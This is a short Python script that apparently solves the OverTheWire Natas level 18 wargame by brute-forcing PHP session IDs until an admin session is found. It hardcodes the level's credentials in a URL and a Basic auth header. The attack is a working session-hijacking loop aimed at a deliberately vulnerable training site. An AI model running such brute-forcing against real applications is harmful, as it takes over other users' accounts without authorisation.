import requests

'''
target = 'http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/'

acceptStr = 'You are an admin.'


r = requests.get(target)

for i in range(1, 641):
	cookies = dict(PHPSESSID=str(i))
	r = requests.get(target, cookies=cookies)
	if r.content.find(acceptStr) != -1:
		print('Admin Session Found: '+str(i))
		print(r.content)
		break
print('End')
'''

for i in range(0, 700):
	url = 'http://natas18.natas.labs.overthewire.org/index.php'
	payload = {'username': 'admin', 'password': 'aa'}
	headers = {'Cookie': "PHPSESSID={0}".format(i), "Authorization": "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=="}

	r = requests.post(url, params=payload, headers=headers)
	if "regular user" in r.text:
		print("Trying Session ID: " + str(i) + "......Fail")
	else:
		print("Admin session found! Session ID: " + str(i))
		print(r.text)
		exit()
